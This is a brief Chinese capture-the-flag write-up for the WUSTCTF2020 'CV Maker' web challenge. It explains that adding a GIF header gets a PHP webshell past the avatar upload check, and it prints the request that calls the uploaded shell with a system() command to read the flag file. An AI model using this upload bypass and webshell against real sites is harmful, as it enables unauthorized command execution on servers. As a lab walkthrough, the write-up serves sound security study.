# [WUSTCTF2020]CV Maker
![](<./img/Pasted image 20221231095511.png>)

---
首页长这样

![](<./img/Pasted image 20221231095544.png>)

注册账号并登录

![](<./img/Pasted image 20221231100127.png>)

这里可以上传头像

没想到加上`GIF`头之后就能顺利上传木马

![](<./img/Pasted image 20221231101933.png>)

```php
/uploads/d41d8cd98f00b204e9800998ecf8427e.php?cmd=system('cat /Flag_aqi2282u922oiji');
```

![](<./img/Pasted image 20221231101816.png>)

#Web #PHP #文件上传 #文件 